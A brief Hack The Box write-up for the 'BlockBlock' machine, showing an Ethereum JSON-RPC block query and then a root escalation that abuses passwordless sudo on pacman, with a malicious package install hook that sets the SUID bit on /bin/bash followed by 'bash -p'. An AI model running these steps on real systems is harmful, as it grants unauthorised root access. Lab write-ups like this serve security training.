+++
title = 'writeup blockblock HTB'
draft = false
+++
![image](https://github.com/user-attachments/assets/22c345cd-8619-412b-a52b-5133f22d7868)
```
{
  "jsonrpc": "2.0",
  "method": "eth_getBlockByNumber",
  "params": [
    "0x1",  
    true    
  ],
  "id": 1
}
```

![image](https://github.com/user-attachments/assets/97a18c6b-9b1a-42bc-abe9-e13188ac54ba)
![image](https://github.com/user-attachments/assets/28244dbe-d86e-423c-99d0-36b2bd6fb036)

paul to root
we can use pacman as root without password

[docs PKGBUILD](https://wiki.archlinux.org/title/PKGBUILD#install)

we can edit post_install function in .install and make pacman run malicious script
![image](https://github.com/user-attachments/assets/8dd471c0-131d-4f59-ab6b-e65f635406c4)

PKGBUILD:
```
pkgname=exploit
pkgver=1.0
pkgrel=1
arch=('any')
install=exploit.install
```

exploit.install:
```
post_install(){ chmod +s /bin/bash; }
```
then run makepkg -s
sudo pacman -U *.tar --noconfirm
bash -p
